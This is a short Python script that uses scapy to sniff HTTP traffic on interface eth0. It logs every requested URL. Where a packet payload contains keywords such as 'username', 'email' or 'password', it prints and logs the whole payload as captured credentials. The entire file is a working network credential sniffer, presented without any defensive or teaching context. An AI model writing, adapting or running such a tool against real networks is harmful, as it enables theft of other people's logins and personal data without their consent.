#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import log

def sniff(inter):
	scapy.sniff(iface=inter, store=False, prn=procSniffPack)
	
def procSniffPack(pack):
	if pack.haslayer(http.HTTPRequest):
		url = str(pack[http.HTTPRequest].Host + pack[http.HTTPRequest].Path)
		resaltUrl = "[+] URL >> " + url
		log.logSniff(resaltUrl)
		print(resaltUrl)
	
		if pack.haslayer(scapy.Raw):
			load = str(pack[scapy.Raw].load)
			keyLoad = ["username", "user", "login", "email", "e-mail", "password", "pass"]
			for item in keyLoad:
				if item in load:
					resaltLogPass = "[!] LOG/PASS: " + load
					log.logSniff(resaltLogPass)
					print(resaltLogPass)
					break
		
sniff("eth0")
